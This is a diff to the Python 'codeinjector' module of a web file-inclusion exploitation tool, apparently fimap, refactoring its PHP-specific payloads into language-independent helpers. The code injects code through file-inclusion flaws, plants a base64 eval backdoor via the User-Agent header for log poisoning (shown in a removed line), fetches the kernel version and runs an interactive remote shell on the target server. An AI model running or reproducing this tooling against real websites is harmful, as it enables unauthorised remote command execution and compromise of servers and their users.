@@ -45,12 +45,6 @@ class codeinjector(baseClass):
     def setReport(self, report):
         self.report = report
 
-    def testExecutionMethods(self):
-        info_payload = self.settings["php_info"][0]
-        info_pattern = self.settings["php_info"][1]
-        
-        #for k,v in self.settings["php_exec"]
-
     def start(self):
         domain = self.chooseDomains()
         vuln   = self.chooseVuln(domain.getAttribute("hostname"))
@@ -68,7 +62,6 @@ class codeinjector(baseClass):
         postdata = vuln.getAttribute("postdata")
         ispost = vuln.getAttribute("ispost") == "1"
         language = vuln.getAttribute("language")
-        print vuln.getAttribute("language")
         
         xml2config = self.config["XML2CONFIG"]
         langClass = xml2config.getAllLangSets()[language]
@@ -121,7 +114,7 @@ class codeinjector(baseClass):
         php_test_code = quiz
         php_test_result = answer
 
-        code = self.__doHaxRequest(url, postdata, mode, php_test_code, suffix)
+        code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix)
         if code == None:
             self._log("%s-code testing failed! code=None"%(language), self.LOG_ERROR)
             sys.exit(1)
@@ -160,7 +153,7 @@ class codeinjector(baseClass):
                         if (kernel == None):
                             self._log("Requesting kernel version...", self.LOG_DEBUG)
                             uname_cmd = item.generatePayload(xml2config.getKernelCode(), True)
-                            kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, suffix).strip()
+                            kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix).strip()
                             self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
                             domain.setAttribute("kernel", kernel)
                             self.saveXML()
@@ -179,7 +172,7 @@ class codeinjector(baseClass):
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
                         pwd_cmd = item.generatePayload("pwd", True)
-                        curdir = self.__doHaxRequest(url, postdata, mode, pwd_cmd, suffix).strip()
+                        curdir = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix).strip()
                         print shell_banner
 
                         while 1==1:
@@ -188,11 +181,11 @@ class codeinjector(baseClass):
                             
                             if (cmd.strip() != ""):
                                 userload = item.generatePayload("cd '%s'; %s"%(curdir, cmd), True)
-                                code = self.__doHaxRequest(url, postdata, mode, userload, suffix)
+                                code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix)
                                 if (cmd.startswith("cd ")):
                                     cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
                                     cmd = item.generatePayload(cmd, True)
-                                    curdir = self.__doHaxRequest(url, postdata, cmd , suffix).strip()
+                                    curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
                                 print code.strip()
                         print "See ya dude!"
                         print "Do not forget to close this security hole."
@@ -210,7 +203,7 @@ class codeinjector(baseClass):
                         shellcode = item.generatePayload(cpayload, True)
 
 
-                    code = self.__doHaxRequest(url, postdata, mode, shellcode, appendix)
+                    code = self.__doHaxRequest(url, postdata, mode, shellcode, langClass, appendix)
                     if (code == None):
                         print "Exploiting Failed!"
                         sys.exit(1)
@@ -233,7 +226,7 @@ class codeinjector(baseClass):
                         else:
                             postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
                         url = "http://%s%s" %(hostname, path)
-                        code = self.__doHaxRequest(url, postdata, mode, "", appendix, False)
+                        code = self.__doHaxRequest(url, postdata, mode, "", langClass, appendix, False)
                         print "--- Unfiltered output starts here ---"
                         print code
                         print "--- EOF ---"
@@ -256,14 +249,14 @@ class codeinjector(baseClass):
             print "Failed to test injection. :("
 
 
-    def __doHaxRequest(self, url, postdata, m, payload, appendix=None, doFilter=True):
+    def __doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True):
         code = None
         rndStart = self.getRandomStr()
         rndEnd = self.getRandomStr()
         
         userload = None
         if doFilter:
-            userload = "<? echo \"%s\"; ?> %s <? echo \"%s\"; ?>" %(rndStart, payload, rndEnd) #TODO: Make language independet.
+            userload = "%s %s %s" %(langClass.generatePrint(rndStart), payload, langClass.generatePrint(rndEnd))
         else:
             pass #userload = "%s%s%s" %(rndStart, payload, rndEnd)
             
@@ -285,7 +278,7 @@ class codeinjector(baseClass):
                 code = self.doPostRequest(url, p)
                 if (code.find(testcode[1]) == -1):
                     self._log("Kickstarter is not present. Injecting kickstarter...", self.LOG_INFO)
-                    kickstarter = "<? eval(base64_decode($_POST['data'])); ?>"
+                    kickstarter = langClass.getEvalKickstarter()
                     ua = self.getUserAgent()
                     self.setUserAgent(kickstarter)
                     tmpurl = None
@@ -297,7 +290,7 @@ class codeinjector(baseClass):
                     self.setUserAgent(ua)
                     
                     self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
-                    testcode = self.getPHPQuiz()
+                    testcode = langClass.generateQuiz()
                     p = "data=" + base64.b64encode(testcode[0])
                     if (postdata != ""):
                         p = "%s&%s" %(postdata, p)
@@ -326,45 +319,53 @@ class codeinjector(baseClass):
         return(code)
 
     def testRFI(self):
-        c, r = self.getPHPQuiz()
-        if (settings["dynamic_rfi"]["mode"] == "local"):
-            print "Testing Local->RFI configuration..."
-            code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", c)
-            if (code == c):
-                print "Dynamic RFI works!"
-                print "Testing if you have disabled .php interpreter..."
-                settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["local"]["local_path"] + ".php"
-                code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"] + ".php", "", "<? %s ?>"%c)
-                if (code == c):
-                    print "ALL OK! You are ready to go!"
-                elif (code == r):
-                    print "WARNING! FILES WHICH ENDS WITH .php WILL BE EXECUTED ON YOUR SERVER! FIX THAT!"
-            else:
-                print "Failed! Something went wrong..."
-
-
-        elif (settings["dynamic_rfi"]["mode"] == "ftp"):
-            print "Testing FTP->RFI configuration..."
-            code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", c)
-            if (code != None):
-                code = code.strip()
+        xml2config = self.config["XML2CONFIG"]
+        langClass = xml2config.getAllLangSets()
+        
+        for langName, langObj in langClass.items():
+            print "Testing language %s..." %(langName)
+            c, r = langObj.generateQuiz()
+            if (settings["dynamic_rfi"]["mode"] == "local"):
+                print "Testing Local->RFI configuration...",
+                code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", "", c)
                 if (code == c):
                     print "Dynamic RFI works!"
-                    print "Testing if you have disabled .php interpreter..."
-                    settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ".php"
-                    code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ".php", "", "<? %s ?>"%c)
-                    if (code == c):
-                        print "ALL OK! You are ready to go!"
-                    elif (code == r):
-                        print "WARNING! FILES WHICH ENDS WITH .php WILL BE EXECUTED ON YOUR SERVER! FIX THAT!"
-
+                    for ext in langObj.getExtentions():
+                        print "Testing %s interpreter..." %(ext),
+                        settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["local"]["local_path"] + ext
+                        code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"] + ext, "", ext, c)
+                        if (code == c):
+                            print "Yep it's disabled."
+                        elif (code == r):
+                            print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
                 else:
                     print "Failed! Something went wrong..."
+    
+    
+            elif (settings["dynamic_rfi"]["mode"] == "ftp"):
+                print "Testing FTP->RFI configuration...",
+                code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", "", c)
+                if (code != None):
+                    code = code.strip()
+                    if (code == c):
+                        print "Dynamic RFI works!"
+                        for ext in langObj.getExtentions():
+                            print "Testing %s interpreter..."%(ext),
+                            settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ext
+                            code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ext, "", ext, c)
+                            if (code == c):
+                                print "Yep it's disabled."
+                            elif (code == r):
+                                print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
+    
+                    else:
+                        print "Failed! Something went wrong..."
+                else:
+                    print "Code == None. That's not good! Failed!"
             else:
-                print "Code == None. That's not good! Failed!"
-        else:
-            print "You haven't enabled and\\or configurated fimap RFI mode."
-            print "Fix that in config.py"
+                print "You haven't enabled and\\or configurated fimap RFI mode."
+                print "Fix that in config.py"
+                sys.exit(0)
             
 
     def convertUserloadToLogInjection(self, userload):
@@ -394,12 +395,6 @@ class codeinjector(baseClass):
                 textarr.append("[%d] %s"%(idx,k))
                 choose[idx] = v
                 idx = idx +1
-            
-            #TODO: SYSTEM COMMANDS FROM GENERIC.XML
-            #for k,v in settings["payloads"]["sys"].items():
-            #    textarr.append("[%d] %s"%(idx,k))
-            #    choose[idx] = ("sys",v)
-            #    idx = idx +1
 
         else:
             header = ":: Available Attacks - %s Only ::" %(language)
